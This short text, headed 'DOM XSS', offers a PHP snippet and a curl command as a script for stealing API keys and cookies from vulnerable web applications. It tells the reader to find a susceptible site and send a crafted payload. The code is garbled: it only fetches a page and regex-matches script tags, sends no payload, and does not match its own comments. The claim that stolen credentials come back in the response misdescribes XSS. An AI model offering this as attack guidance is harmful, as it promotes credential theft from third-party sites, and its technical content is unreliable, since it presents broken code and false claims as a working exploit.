# DOM
XSS

this is code XSS:
<?php
// Set the URL of the vulnerable web application
$url = "http://example.com/api";
// Send an HTTP request with a specially crafted payload containing malicious JavaScript code 
$response = file_get_contents($url); 
// Extract the stolen data from the response using regular expressions 
preg_match('/<script.*?>(.*?)<\/script>/si', $response, $matches); 
// Print out any API keys or cookies found in the match array (if any)  
print_r($matches[1]); ?>  		

 To use the XXS script, you'll need to find a vulnerable web application that is susceptible to cross-site scripting (XSS) attacks. Once you have identified such a vulnerability, you can send an HTTP request with the specially crafted payload containing the XXS script.

For example, if you want to target "http://example.com/api", you would send an HTTP request like this:

curl -X GET http://example.com/api?payload=<your_XXS_script> 
Replace <your_XXS_script> with the actual code from the XXS script provided earlier. The response from the vulnerable web application should contain any stolen API keys or cookies in plain text within its HTML content. You can then extract these using regular expressions as shown in the code example above.
